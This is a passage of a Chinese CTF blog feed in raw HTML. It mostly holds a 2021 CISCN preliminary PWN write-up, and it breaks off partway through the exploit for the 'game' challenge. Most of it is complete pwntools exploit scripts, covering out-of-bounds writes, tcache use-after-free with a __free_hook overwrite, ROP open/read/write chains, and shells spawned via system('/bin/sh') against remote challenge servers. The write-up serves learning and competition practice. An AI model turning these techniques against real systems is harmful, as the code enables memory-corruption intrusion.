class="literal">True</span>:</span><br><span class="line">    password = predict(data)</span><br><span class="line">    uncompress(password)</span><br><span class="line">    data = data[<span class="number">-623</span>:]</span><br><span class="line">    data.append(password)</span><br></pre></td></tr></table></figure><p>解压到最后一层得到文件 flag，代码会因为找不到 unknow.zip 而报错停止，打开文件 flag 即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021HWS线上赛-WP&quot;&gt;&lt;a href=&quot;#2021HWS线上赛-WP&quot; class=&quot;headerlink&quot; title=&quot;2021HWS线上赛-WP&quot;&gt;&lt;/a&gt;2021HWS线上赛-WP&lt;/h1&gt;&lt;h2 id=&quot;shop&quot;&gt;&lt;a href=&quot;#shop&quot;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2021CISCN初赛-WP(PWN)</title>
    <link href="https://nuoye-blog.github.io/2021/05/16/466a7375/"/>
    <id>https://nuoye-blog.github.io/2021/05/16/466a7375/</id>
    <published>2021-05-16T06:00:00.000Z</published>
    <updated>2021-05-16T06:03:50.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021CISCN初赛-WP-PWN"><a href="#2021CISCN初赛-WP-PWN" class="headerlink" title="2021CISCN初赛-WP(PWN)"></a>2021CISCN初赛-WP(PWN)</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>熬到4点多，总算把题目全做完了，感谢逆向师傅<a href="https://lantern.cool/" target="_blank" rel="noopener">lantern</a>的帮忙，总的来说题量还是有点多的，题目也有点难度，有些题差点来不及交，还好最终做完了。</p><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>write的时候可以越界，第一次读入到0x202860处使fd非法，从而在第二次读入时会写入0，这样就可以做到写入操作。</p><p>通过read越界读取出libc，然后越界写入system地址到exit退出时调用的地址，并将参数修改为/bin/sh，退出程序即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"124.71.230.240"</span>,<span class="string">"26157"</span>)</span><br><span class="line">libc = ELF(<span class="string">"pwny"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.send(p64(idx))</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">read_s(<span class="number">0xFFFFFFFFFFFFFFFC</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-0x3ec680</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">read_s(<span class="number">0xFFFFFFFFFFFFFFF5</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">pie = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x58</span></span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line">one = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">write_s((libc.address+<span class="number">0x61b968</span> - pie)/<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">write_s((libc.address+<span class="number">0x61bf60</span> - pie)/<span class="number">8</span>)</span><br><span class="line">p.sendline(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b _dl_fini')</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><p>只有一个堆块的操作，存在UAF，修改tcache结构，使获得一个指向size位（0x80)及一个指向fd的tcache，并且设置0x90的tcache为8，然后利用上面的两个tcache修改其size为0x90，并free掉，这样即可获得libc地址。</p><p>然后利用UAF申请到<code>__free_hook</code>并修改为system地址，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"lonelywolf"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"124.71.230.240"</span>,<span class="string">"26077"</span>)</span><br><span class="line">libc = ELF(<span class="string">"lonelywolf"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'\n'</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x260</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p32(<span class="number">0</span>)+<span class="string">'\x00\x01\x01\x08'</span>+p64(<span class="number">0</span>)*<span class="number">10</span>+p64(heap+<span class="number">0x250</span>)*<span class="number">3</span>+p64(heap+<span class="number">0x260</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">'\x00'</span>*<span class="number">0x8</span>+p64(<span class="number">0x31</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="string">'/bin/sh\x00'</span>+p64(libc.sym[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><p>劫持步骤同上，达到任意地址申请的目的后，申请到environ变量获取栈地址，从而将栈返回地址覆盖为我们的rop串，实现orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("silverwolf")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"124.71.230.240"</span>,<span class="string">"26121"</span>)</span><br><span class="line">libc = ELF(<span class="string">"silverwolf"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x1170</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">'\x00'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p32(<span class="number">0</span>)+<span class="string">'\x01\x01\x04\x08'</span>+p64(<span class="number">0</span>)*<span class="number">10</span>+p64(heap+<span class="number">0xe50</span>)+p64(heap+<span class="number">0xe50</span>+<span class="number">0x80</span>)+p64(heap+<span class="number">0xe40</span>)+p64(heap+<span class="number">0xe50</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">'environ'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0xf0</span><span class="number">-0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x0000000000043ae8</span> + libc.address</span><br><span class="line">pop_rdi = <span class="number">0x00000000000215bf</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023eea</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x11B637</span> + libc.address</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap + <span class="number">0x001960</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap + <span class="number">0x1000</span>)</span><br><span class="line">payload1 = <span class="string">''</span></span><br><span class="line">payload1 += p64(pop_rdx)</span><br><span class="line">payload1 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload1 += p64(pop_rax)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(stack+<span class="number">0x78</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">'./flag\x00\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(payload1+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(stack)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">'./flag\x00\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1056)')</span></span><br><span class="line">edit(payload+<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>对玩家进行位移时存在溢出，可以修改下一个chunk的size位，从而实现堆溢出攻击。利用unsortbin泄漏出libc后，申请到environ变量获取栈地址，然后将栈上的返回地址覆盖为ROP串实现ORW即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./game"</span>)</span><br><span class="line">p = remote(<span class="string">"124.71.230.240"</span>,<span class="string">"26156"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./game1"</span>).libc</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op</span><span class="params">(op)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"op:"</span> + str(op) + <span class="string">"\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">id</span><span class="params">(id)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"id:"</span> + str(id) + <span class="string">"\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">YMAX</span><span class="params">(y_max)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"w:"</span> + str(y_max) + <span class="string">"\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XMAX</span><span class="params">(x_max)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"l:"</span> + str(x_max) + <span class="string">"\n"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(size)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"s:"</span> + str(size) + <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_game</span><span class="params">(xmax, ymax)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">1</span>)</span><br><span class="line">line += XMAX(xmax)</span><br><span class="line">line += YMAX(ymax)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_player</span><span class="params">(_id, _size,data)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">2</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">line += size(_size)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"desc&gt;"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_player_by_id</span><span class="params">(_id)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">3</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_all</span><span class="params">()</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_y_by_id</span><span class="params">(_id)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">5</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inc_y_by_id</span><span class="params">(_id)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">6</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_x_by_id</span><span class="params">(_id)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">7</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span 